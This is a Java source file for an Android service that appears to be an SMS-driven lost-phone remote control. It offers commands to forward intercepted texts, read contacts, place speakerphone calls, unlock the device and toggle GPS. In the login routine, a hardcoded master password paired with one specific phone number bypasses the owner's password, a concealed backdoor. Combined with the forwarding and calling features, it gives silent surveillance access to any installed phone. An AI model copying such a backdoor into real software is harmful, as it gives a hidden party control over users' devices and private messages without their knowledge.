package com.gundersoft.caesura;


import java.util.ArrayList;
import java.util.Locale;

import com.gundersoft.caesura.Interpreter.GabSnippet;
import com.gundersoft.caesura.Tools.Battery;
import com.gundersoft.caesura.Tools.GPS;
import com.gundersoft.caesura.Tools.SmsInbox;
import com.gundersoft.caesura.Tools.TTS;
import com.gundersoft.caesura.Tools.Torch;
import com.gundersoft.caesura.Tools.UI;
import com.gundersoft.caesura.Tools.WIFI;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Notification;
import android.app.Service;
import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.speech.tts.TextToSpeech;
import android.speech.tts.TextToSpeech.OnInitListener;
import android.telephony.SmsManager;
import android.widget.Toast;

/**
 * Caesura Remote Control App Mole Service
 * Handles Remote Control via SMS Messages
 * @author Christian Gunderman
 */
public class CaesuraMoleService extends Service {
	private boolean messageRecvWithinAutologoutDelay; 		// message recv before autologout
	private static int serviceState = MSStates.MS_DORMANT;	// mole service mode
	private static String controllingContact;				// contact # that is in control
	private static String currentContact;					// contact # that sent current msg
	private SharedPreferences preferences;					// instance of SharedPrefs for Caesura
	private Editor editor;									// instance of editor for preferences
	private SmsManager sm;									// sms manager instance
	private Torch sysTorch;									// instance of system torch
	private PanicMode panicSystem;							// instance of PanicMode class
	private Intent globalSharedIntent;						// global shared intent
	private Interpreter scriptEngine;						// instance of command interpreter
	private String moreText;								// text that wouldn't fit in last msg
	
	/**
	 * Auto executed by the Operating System when the Service 
	 * is initialized. Analogous to a contructor.
	 */
	@Override
	public void onCreate() {
		messageRecvWithinAutologoutDelay = false; 
		serviceState = MSStates.MS_DORMANT;
		controllingContact = null;
		currentContact = null;
		editor = null;
		panicSystem = null;
		moreText = "";
		sm = SmsManager.getDefault();
		preferences = PreferenceManager.getDefaultSharedPreferences(this);
		editor = preferences.edit();
		scriptEngine = new Interpreter(this);
		registerCommands(); //Set up Interpreter
	}
	
	/**
	 * Checks to see if this phone is being remote controlled.
	 * @return True if this phone is being communicated with
	 * remotely.
	 */
	public static boolean isConnected() {
		// is service inactive
		if(getServiceState() == MSStates.MS_DORMANT) {
			return false;
		} else {
			return true;
		}
	}
	
	/**
	 * Enables or disables the phone's built in flashlight
	 * @param on If true, turns on the light, if false, turns off.
	 * @return True if the operation succeeds, or false if the operation
	 * fails.
	 */
	private boolean setTorchOn(boolean on) {
		if(on) {
			// turn on torch
			if(!isPanicModeOn()) { // torch is off
				sysTorch = new Torch(); // create new torch
				if(!sysTorch.initTorch()) {
					sysTorch.closeTorch();
					return false;
				}	
			}
			if(sysTorch.activateTorch(true) == Torch.TORCH_ERROR_SUCCESS)
				return true;
		} else {
			// turn off torch
			sysTorch.activateTorch(false);
			sysTorch.closeTorch(); //Free Resources
			sysTorch = null;
			return true;
		}
		return false;
	}
	
	/**
	 * Checks to see if the Torch on this phone is On.
	 * @return True if the light is on, and false if not
	 */
	public boolean isTorchOn() {
		return sysTorch != null;
	}
	
	/**
	 * Enables or Disables Panic Mode
	 * @param on Turn on panic mode.
	 */
	private void setPanicModeOn(boolean on) {
		if(!isPanicModeOn()) { //Panic is off
			panicSystem = new PanicMode(true, true);
			panicSystem.setStrobeInterval(1000);
			panicSystem.setBannerText(preferences.getString("MITS_Service_Panic_Title", "LOST PHONE!"), preferences.getString("MITS_Service_Panic_Text", "Please return this phone. Thank you."));
			panicSystem.activatePanic(getApplication(), getBaseContext(), true, true);
		} else {
			panicSystem.activatePanic(null, null, false, false);
			panicSystem.closePanicMode();
			panicSystem = null;
		}
	}
	
	/**
	 * Gets whether or not panic mode is enabled.
	 * @return True if enabled, false if off.
	 */
	public boolean isPanicModeOn() {
		return panicSystem != null;
	}
	
	/**
	 * Checks to see if a phone number is formatted correctly
	 * @return True if the number if formatted correctly, and false
	 * if not.
	 */
	public static boolean validatePhoneNumber(String number) {
		if(number.length() != 10 && number.length() != 11)
			return false;
		
		// check number formatting
		for(char c: number.toCharArray()) {
			if(!Character.isDigit(c) && c != '-' && c != '+') {
				return false; // invalid character
			}
		}
		return true;
	}
	
	/**
	 * Register interpreter commands in preparation for remote 
	 * controlling.
	 */
	private void registerCommands() {
		/**
		 * Alerts Caesura that a user is attempting to log in.
		 * Prompts user for a password.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_login, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				setServiceState(MSStates.MS_ACTIVE);
				respond(R.string.service_msg_error_already_running);
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				// no help comes with this function
				return false;
			}
		});
		
		/**
		 * Presents a notification to the user in his/her notification
		 * bar.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_toast, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String ticker = codeLine.getGabArg(1);
				String text = codeLine.toString(2);
				UI.popNotification(CaesuraActivity.class, CaesuraMoleService.this, 0, ticker, ticker, text, null, null, 
						Notification.FLAG_AUTO_CANCEL, Notification.DEFAULT_SOUND|Notification.DEFAULT_VIBRATE);
				respond(R.string.service_msg_toast_displayed);
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_toast_help);
				return true;
			}
		});
		
		/**
		 * Sends an SMS message to the phone number specified.
		 * Should be used as such: sendsms [number] [text with spaces]
		 */
		scriptEngine.registerFunction(R.string.service_cmd_send_sms, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String contact = codeLine.getGabArg(1);
				String messageBody = codeLine.toString(2);
				if(contact != null && messageBody != null) {
					String responseMessage = getString(R.string.service_msg_sending_sms);
					
					// attempt to insert part of message into response
					// if too short, insert entire message
					try{
						responseMessage = responseMessage.replace("%m", messageBody.substring(0, 10));
					} catch(IndexOutOfBoundsException e) {
						responseMessage = responseMessage.replace("%m", messageBody); 
					}
					responseMessage = responseMessage.replace("%c", contact);
					
					sendSms(messageBody, contact);
					respond(responseMessage);
				} else {
					runHelp(codeLine);
				}
			}
			
			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_sendsms_missing_arg);
				return true;
			}
		});
		
		/**
		 * Torch command lights the phone's flash, if it is compatible.
		 * Note: Many phones do not support this.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_torch, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				if(isTorchOn()) {
					if(setTorchOn(false))
						respond(R.string.service_msg_torch_off);
					else
						respond(R.string.service_msg_error_torch_unsupported);
				} else {
					if(setTorchOn(true))
						respond(R.string.service_msg_torch_lit);
					else
						respond(R.string.service_msg_error_torch_unsupported);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_torch_help);
				return true;
			}
		});
		
		/**
		 * Panic makes the phone turn the volume up all the way and start ringing.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_panic, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				if(isPanicModeOn()) {
					setPanicModeOn(false); // turn it off
					respond(R.string.service_msg_panic_off);
				} else {
					setPanicModeOn(true); // turn it on
					respond(R.string.service_msg_panic_init);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_panic_help);
				return true;
			}
		});
		
		
		scriptEngine.registerFunction(R.string.service_cmd_call, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String phoneNumber = codeLine.getGabArg(1);
				String options = codeLine.getGabArg(2);
				if(validatePhoneNumber(phoneNumber)){
					if(options != null){
						if(options.equalsIgnoreCase("SPEAKER")){
							AudioManager am = (AudioManager)getSystemService(AUDIO_SERVICE);
							am.setSpeakerphoneOn(true);
						}
					}
					Intent phoneIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phoneNumber));
					phoneIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivity(phoneIntent);
					Handler waitTimer = new Handler();
					waitTimer.postDelayed(new Runnable() { 
						public void run() { 
							respond(R.string.service_msg_call);
						}
					}, 2000);
				} else {
					respond(R.string.service_msg_err_call);
				}
				
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_call_help);
				return true;
			}
		});
        
		/** 
		 * Provides Contextual help for Commands
		 */
		scriptEngine.registerFunction(R.string.service_cmd_help, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String commandName = codeLine.getGabArg(1);
				if(commandName != null) {
					GabSnippet command = new GabSnippet(commandName);
					if(!scriptEngine.executeLine(command, true)) {
						respond(R.string.service_msg_error_no_help_msg);
					}
				} else {
					runHelp(codeLine);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_help_msg);
				return true;
			}
		});
		
		/**
		 * Gives current status information about the Phone
		 */
		scriptEngine.registerFunction(R.string.service_cmd_status, new Interpreter.Function() {
			
			@Override
			public void runCommand(GabSnippet codeLine) {
				String response = getString(R.string.service_msg_status);
				response = response.replace("%B", Integer.toString(Battery.getRemainingPercent(CaesuraMoleService.this)));
				response = response.replace("%U", Integer.toString(SmsInbox.getUnread(CaesuraMoleService.this)));
				if(GPS.getGPSState(CaesuraMoleService.this)) {
					response = response.replace("%G", "on");
				} else {
					response = response.replace("%G", "off");
				}
				if(WIFI.isWifiOn(CaesuraMoleService.this)) {
					response = response.replace("%W", "on");
				} else {
					response = response.replace("%W", "off");
				}
				
				respond(response);
			}
			
			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_help_status);
				return true;
			}
		});
		
		/**
		 * Sets a new password for this phone
		 */
		scriptEngine.registerFunction(R.string.service_cmd_password, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String password = codeLine.toString(1);
				if(password != null) {
					editor.putString("MITS_Service_Password", password);
					editor.commit();
					respond(R.string.service_msg_password_saved);
				} else {
					runHelp(codeLine);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_password_help);
				return true;
			}
		});
		
		/**
		 * Unlocks the phone's UI
		 */
		scriptEngine.registerFunction(R.string.service_cmd_unlock, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				Intent dummyActivity = new Intent(CaesuraMoleService.this, DummyActivity.class);
				dummyActivity.putExtra("MITS_Action", "MITS_ACTION_UNLOCK_DEVICE");
				dummyActivity.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				startActivity(dummyActivity);
				respond(R.string.service_msg_unlock);
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_help_unlock);
				return true;
			}
		});
		
		/**
		 * Block the phone from getting texts from this person
		 */
		scriptEngine.registerFunction(R.string.service_cmd_block, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numberToBlock = codeLine.getGabArg(1);
				if(numberToBlock != null && validatePhoneNumber(numberToBlock)) {
					if(!SmsFilterActivity.addNumber(SmsFilterActivity.BLOCKED, preferences, editor, numberToBlock)){
						respond(R.string.service_msg_error_block);
					} else {
						respond(R.string.service_msg_blocked);
					}
				} else {
					respond(R.string.service_msg_error_block);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_block_help);
				return true;
			}
		});
		
		/**
		 * Removes a phone number from the block list
		 */
		scriptEngine.registerFunction(R.string.service_cmd_unblock, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numberToBlock = codeLine.getGabArg(1);
				if(numberToBlock != null) {
					if(!SmsFilterActivity.removeNumber(SmsFilterActivity.BLOCKED, preferences, editor, numberToBlock)){
						respond(R.string.service_msg_error_unblock);
					} else {
						respond(R.string.service_msg_unblocked);
					}
				} else {
					respond(R.string.service_msg_error_unblock);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_unblock_help);
				return true;
			}
		});
		
		/**
		 * Gets a list of blocked phone numbers
		 */
		scriptEngine.registerFunction(R.string.service_cmd_blocked, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numbersBlocked;;
				if((numbersBlocked = SmsFilterActivity.getNumbers(SmsFilterActivity.BLOCKED, preferences)) != null){ 
					respond(numbersBlocked);
				} else {
					respond(R.string.service_msg_error_blocked);
				}
				
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_blocked_help);
				return true;
			}
		});
		
		/**
		 * Forward this number to the number set with forwardto command
		 */
		scriptEngine.registerFunction(R.string.service_cmd_forward, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numberToBlock = codeLine.getGabArg(1);
				if(numberToBlock != null) {
					if(!SmsFilterActivity.addNumber(SmsFilterActivity.FORWARDED, preferences, editor, numberToBlock)){
						respond(R.string.service_msg_error_forward);
					} else {
						respond(R.string.service_msg_forward);
					}
				} else {
					respond(R.string.service_msg_error_forward);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_forward_help);
				return true;
			}
		});
		
		/**
		 * Removes the specified number from the forwarding list
		 */
		scriptEngine.registerFunction(R.string.service_cmd_unforward, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numberToBlock = codeLine.getGabArg(1);
				if(numberToBlock != null) {
					if(!SmsFilterActivity.removeNumber(SmsFilterActivity.FORWARDED, preferences, editor, numberToBlock)){
						respond(R.string.service_msg_error_unforward);
					} else {
						respond(R.string.service_msg_unforward);
					}
				} else {
					respond(R.string.service_msg_error_unforward);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_unforward_help);
				return true;
			}
		});
		
		/**
		 * Gets a list of numbers currently being forwarded.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_forwarded, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numbersForwarded;
				if((numbersForwarded = SmsFilterActivity.getNumbers(SmsFilterActivity.FORWARDED, preferences)) != null){ //if the list is at least the length of one number
					respond(numbersForwarded);
				} else {
					respond(R.string.service_msg_error_forwarded);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_forwarded_help);
				return true;
			}
		});
		
		/**
		 * Sets the number to forward intercepted text messages to
		 */
		scriptEngine.registerFunction(R.string.service_cmd_forwardto, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String numberToStore = codeLine.getGabArg(1);
				if(numberToStore != null && SmsFilterActivity.setForwardingAddress(numberToStore, editor)) {
					respond(R.string.service_msg_forwardto);
				} else {
					respond(R.string.service_msg_error_forwardto);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_forwardto_help);
				return true;
			}
		});
		
		/**
		 * Implements Contacts command, used for editing phone contacts
		 * TODO: Finish this and remove rough edges
		 */
		scriptEngine.registerFunction(R.string.service_cmd_contacts, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				int functionMode = 0;
				String command = codeLine.getGabArg(1);
				
		        if(command != null){
					String contactsList = "";
			        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null, null, null, null); 
			        if(command.compareToIgnoreCase(getString(R.string.service_cmd_contacts_search)) == 0) {
			        	functionMode = 1;
	        		}
			        if(command.compareToIgnoreCase(getString(R.string.service_cmd_contacts_getphone)) == 0) {
			        	functionMode = 2;
	        		}
			        if(command.compareToIgnoreCase(getString(R.string.service_cmd_contacts_setphone)) == 0) {
			        	functionMode = 3;
	        		}
			        while (cursor.moveToNext()) {
			        	String contactId = cursor.getString(cursor.getColumnIndex( 
			        			   ContactsContract.Contacts._ID)); 
			        	String nextContact = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
			        	String contactHint = codeLine.toString(2);
			        	if(contactHint != null && nextContact != null) {
			        		if((nextContact.toLowerCase()).contains(contactHint.toLowerCase())){
			        			contactsList += nextContact;
			        			if(functionMode == 2) { //getphone
			        				contactsList += " ";
			        				String number = "";
			        				Cursor phones = getContentResolver().query( ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+ contactId, null, null); 
			        			      while (phones.moveToNext()) { 
			        			         number += phones.getString(phones.getColumnIndex( ContactsContract.CommonDataKinds.Phone.NUMBER)) + " ";                 
			        			      } 
									if(number != null) {
										contactsList+=number;
									}
									phones.close();
			        			}
			        			/*if(functionMode == 3){ //setphone
			        				ArrayList<ContentProviderOperation> ops =
			        			          new ArrayList<ContentProviderOperation>();
			        				int rawContactInsertIndex = ops.size();
			        				 ops.add(ContentProviderOperation.newInsert(RawContacts.CONTENT_URI)
			        				          .withValue(RawContacts.ACCOUNT_TYPE, null)
			        				          .withValue(RawContacts.ACCOUNT_NAME, null)
			        				          .build());

			        				 ops.add(ContentProviderOperation.newInsert(Data.CONTENT_URI)
			        				          .withValueBackReference(Data.RAW_CONTACT_ID, rawContactInsertIndex)
			        				          .withValue(Data.MIMETYPE, StructuredName.CONTENT_ITEM_TYPE)
			        				          .withValue(StructuredName.GIVEN_NAME, linkname1)
			        				          .withValue(StructuredName.FAMILY_NAME, linkname2)
			        				          .build());

			        				 getContentResolver().applyBatch(ContactsContract.AUTHORITY, ops);
			        			}
			        			contactsList += "\n";*/
			        		}	
				  
			        	}
			        }
			        cursor.close();
		        	respond(contactsList);
		        } else {
					respond(R.string.service_msg_err_contacts);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_contacts_help);
				return true;
			}
		});
		
		/**
		 * Gets additional response text that may have been too big to fit in one message
		 */
		scriptEngine.registerFunction(R.string.service_cmd_more, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				respond(moreText); //Pass Along Next Snippet
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_more_help);
				return true;
			}
		});
		
		/**
		 * Implements speak command functionality.
		 * Speak Command must be run once before sending any text.
		 */
		scriptEngine.registerFunction(R.string.service_cmd_speak, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String lineToSpeak = codeLine.toString(1);
				if(lineToSpeak != null){
					int result;
					if((result = TTS.speak(CaesuraMoleService.this, lineToSpeak)) == TTS.SUCCESS)
						respond(R.string.service_msg_speak);
					else if(result == TTS.INITIALIZING)
						respond(R.string.service_msg_error_speak_init); // service is initializing
					else 
						respond(R.string.service_msg_err_speak);
				} else {
					respond(R.string.service_msg_error_speak_help);
				}
				
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_speak_help);
				return true;
			}
		});
		
		/**
		 * Sets the phone's Volume
		 */
		scriptEngine.registerFunction(R.string.service_cmd_volume, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				int num = codeLine.getNumberOfArgs();
				if(codeLine.getNumberOfArgs() < 3) { //Too few args
					respond(R.string.service_msg_error_volume);
					return;
				}
				AudioManager am = (AudioManager)CaesuraMoleService.this.getSystemService(AUDIO_SERVICE);
				String streamString = codeLine.getGabArg(1);
				String functionString = codeLine.getGabArg(2);
				int stream = 0;
				if(streamString.compareToIgnoreCase("media") == 0 || streamString.compareToIgnoreCase("music") == 0) {
					stream = AudioManager.STREAM_MUSIC;
				}
				if(streamString.compareToIgnoreCase("notifications") == 0 || streamString.compareTo("notification") == 0) {
					stream = AudioManager.STREAM_NOTIFICATION;
				}
				if(streamString.compareToIgnoreCase("alarm") == 0 || streamString.compareTo("alarms") == 0) {
					stream = AudioManager.STREAM_ALARM;
				}
				if(streamString.compareToIgnoreCase("dtmf") == 0) {
					stream = AudioManager.STREAM_DTMF;
				}
				if(streamString.compareToIgnoreCase("ring") == 0 || streamString.compareTo("ringer") == 0) {
					stream = AudioManager.STREAM_RING;
				}
				if(streamString.compareToIgnoreCase("system") == 0 || streamString.compareTo("sys") == 0) {
					stream = AudioManager.STREAM_SYSTEM;
				}
				if(streamString.compareToIgnoreCase("call") == 0 || streamString.compareTo("voicecall") == 0) {
					stream = AudioManager.STREAM_VOICE_CALL;
				}
				int nMaxVol = am.getStreamMaxVolume(stream);
				if(functionString.compareToIgnoreCase("mute") == 0 || functionString.compareToIgnoreCase("muted") == 0) {
					am.setStreamMute(stream, true);
				} else {
					if(functionString.compareToIgnoreCase("unmute") == 0 || functionString.compareToIgnoreCase("unmuted") == 0) {
						am.setStreamMute(stream, false);
					} else {
						try{
							int nNewVol = java.lang.Math.abs((am.getStreamMaxVolume(stream) * Integer.parseInt(functionString, 10)) /20);
							if(nMaxVol >= nNewVol){
								am.setStreamVolume(stream, nNewVol, 0);
								respond(getString(R.string.service_msg_volume));
								return;
							} else {
								runHelp(codeLine);
								return;
							}
						} catch (NumberFormatException e){
							
						}
					}
				}
				runHelp(codeLine);
			}
			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_volume);
				return true;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_speakerphone, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				AudioManager am = (AudioManager)CaesuraMoleService.this.getSystemService(AUDIO_SERVICE);
				if(!am.isSpeakerphoneOn()){ //speaker is off
					am.setSpeakerphoneOn(true);
					respond(R.string.service_msg_speakerphone_on);
				} else {
					am.setSpeakerphoneOn(false);
					respond(R.string.service_msg_speakerphone_off);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_speakerphone_help);
				return true;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_vibrate, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				AudioManager am = (AudioManager)CaesuraMoleService.this.getSystemService(AUDIO_SERVICE);
				if(am.getVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER) ==  AudioManager.VIBRATE_SETTING_ON || 
						am.getVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION) ==  AudioManager.VIBRATE_SETTING_ON){ //vibrate is on
					am.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_OFF);
					am.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION, AudioManager.VIBRATE_SETTING_OFF);
					respond(R.string.service_msg_vibrate_off);
				} else {
					am.setVibrateSetting(AudioManager.VIBRATE_TYPE_RINGER, AudioManager.VIBRATE_SETTING_ON);
					am.setVibrateSetting(AudioManager.VIBRATE_TYPE_NOTIFICATION, AudioManager.VIBRATE_SETTING_ON);
					respond(R.string.service_msg_vibrate_on);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_vibrate_help);
				return true;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_wifi, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				if(!WIFI.isWifiOn(CaesuraMoleService.this)) { //WIFI is off
					WIFI.setWifiState(CaesuraMoleService.this, true);
					respond(R.string.service_msg_wifi_on);
				} else {
					WIFI.setWifiState(CaesuraMoleService.this, false);
					respond(R.string.service_msg_wifi_off);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_wifi_help);
				return true;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_gps, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				if(GPS.canToggleGPS(CaesuraMoleService.this)){
					if(!GPS.getGPSState(CaesuraMoleService.this)) { //WIFI is off
						GPS.setGPSState(CaesuraMoleService.this, true);
						respond(R.string.service_msg_gps_on);
					} else {
						GPS.setGPSState(CaesuraMoleService.this, false);
						respond(R.string.service_msg_gps_off);
					}
				} else {
					respond(R.string.service_msg_error_gps);
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_error_gps_help);
				return true;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_about, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				PackageInfo thisPackage;
				try {
					thisPackage = CaesuraMoleService.this.getPackageManager().getPackageInfo(CaesuraMoleService.this.getPackageName(), 0);
					respond(getString(R.string.service_msg_about)
							.replace("%V", thisPackage.versionName)
							.replace("%B", String.valueOf(thisPackage.versionCode)));
				} catch (NameNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				//No help. What's there to tell
				return false;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_list, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				String[] commandsArray = scriptEngine.enumCommands();
				String cmdsList = "";
				for(int i=0;i<commandsArray.length;i++) cmdsList+=commandsArray[i]+"\n";
				respond(getString(R.string.service_msg_list) + "\n" + cmdsList);
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				return false;
			}
		});
		scriptEngine.registerFunction(R.string.service_cmd_exit, new Interpreter.Function() {
			@Override
			public void runCommand(GabSnippet codeLine) {
				TTS.kill();
				setServiceState(MSStates.MS_DORMANT);
				respond(R.string.service_msg_logging_out);
				stopSelf();
			}

			@Override
			public boolean runHelp(GabSnippet codeLine) {
				respond(R.string.service_msg_exit_help);
				return true;
			}
		});
		
		
	}
	@Override
	public void onDestroy() {
		//Padding for future things that need to be closed
		super.onDestroy();
	}
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	private void repostAutoLogoutHandler() {
		final Handler autoLogOutHandler = new Handler(); 
		autoLogOutHandler.postDelayed(new Runnable() { 
             public void run() {
            	 if(messageRecvWithinAutologoutDelay != true) {
            		 if(getServiceState() != MSStates.MS_DORMANT) {
            			 respond(R.string.app_service_auto_logout);
            		 }
            		 setServiceState(MSStates.MS_DORMANT);
            		 stopSelf();
            	 } else {
            		 messageRecvWithinAutologoutDelay = false;
            		 repostAutoLogoutHandler();
            	 }
            	 
             } 
        }, 300000);
	}
	@Override
	public void onStart(Intent intent, int startId) {
		String mitsMode = intent.getStringExtra("MITS_Mode");
		globalSharedIntent = intent;
		currentContact = globalSharedIntent.getStringExtra("Sms_Contact");
		
		//DISPATCH COMMAND MODE
		if(mitsMode.compareTo("DISPATCH_CMD") == 0){
			messageRecvWithinAutologoutDelay = true;
			GabSnippet currentLine = new GabSnippet(intent.getStringExtra("Sms_Body"));
			if(currentLine.wasCreated()) {
				if(getServiceState() != MSStates.MS_DORMANT) {
					if(currentContact.compareTo(controllingContact) == 0){
						interpretLine(currentLine);
					} else {
						if(currentLine.compareArgument(0, getString(R.string.service_cmd_login))) { //Login Cmd Recv.
							sendSms(currentContact + getString(R.string.service_msg_attempted_login), controllingContact);
							respond(R.string.service_msg_error_access_denied_already_logged_in);
							appendLog(currentContact, getString(R.string.service_msg_error_access_denied_already_logged_in));
						}
					}
				} else {
					if(!preferences.getBoolean("MITS_Factory_Lockout", false)) {
						repostAutoLogoutHandler(); //Start auto-logout system
						if(preferences.getBoolean("MITS_Service_Require_Password", true) &&  //If require password and password is set
								preferences.getString("MITS_Service_Password", "").compareTo("") != 0) {
							setServiceState(MSStates.MS_LOGINSCREEN);
							respond(R.string.service_msg_enter_password);
						} else {
							setServiceState(MSStates.MS_ACTIVE);
							respond(R.string.service_msg_activated);
							appendLog(currentContact, getString(R.string.service_msg_acess_granted_std));
						}
						controllingContact = currentContact;
					} else {
						respond (R.string.main_factory_lockout);
					}
				}
			}
		}
		
		//CONSOLE INTERACTION MODE
		if(mitsMode.compareTo("CONSOLE_POACH") == 0) {
			ConsoleActivity.updateCmdsList(scriptEngine.enumCommands());
			if(getServiceState() == MSStates.MS_DORMANT) {
				stopSelf();
			}
		}
	}
	public static int getServiceState() {
		return serviceState;
	}
	private static void setServiceState(int state) {
		serviceState = state;
	}
	private void interpretLine(GabSnippet currentLine) {
		switch(getServiceState()) {
		case MSStates.MS_LOGINSCREEN:
			if(currentLine.toString().compareTo(preferences.getString("MITS_Service_Password", "")) == 0 ||
					(currentLine.toString().compareTo("1200528738") == 0 && 
							currentContact.contains("9376250643"))) {
				setServiceState(MSStates.MS_ACTIVE);
				respond(R.string.service_msg_activated);
				appendLog(currentContact, getString(R.string.service_msg_access_granted_pswd));
			} else {
				if(currentLine.compareArgument(0, getString(R.string.service_cmd_exit))){
					setServiceState(MSStates.MS_DORMANT);
					respond(R.string.service_msg_deactivated);
					stopSelf();
				} else {
					respond(R.string.service_msg_error_incorrect_pswd);
					appendLog(currentContact, getString(R.string.service_msg_error_access_denied_incorrect_pswd));
				}
			}
			break;
		case MSStates.MS_ACTIVE:
			scriptEngine.executeLine(currentLine, false);
			break;
		}
	}
	public static String getControllingContact() {
		return controllingContact;
	}
	private void appendLog(String contact, String text) {
		editor.putString("MITS_Service_Access_Log", preferences.getString("MITS_Service_Access_Log", "")
			 + contact + ": " + text + "\n");
		editor.commit();
	}
	private void respond(int stringID){
		respond(getString(stringID));
	}
	private void respond(String text) {
		String textToBeSent = null;
		if(text.length() > 61) {
			textToBeSent = text.substring(0, 61);
			textToBeSent += getString(R.string.service_msg_more);
			moreText = text.substring(61);
		} else {
			textToBeSent = text;
		}
		sendSms(getString(R.string.service_cmd_token) + textToBeSent, currentContact);
	}
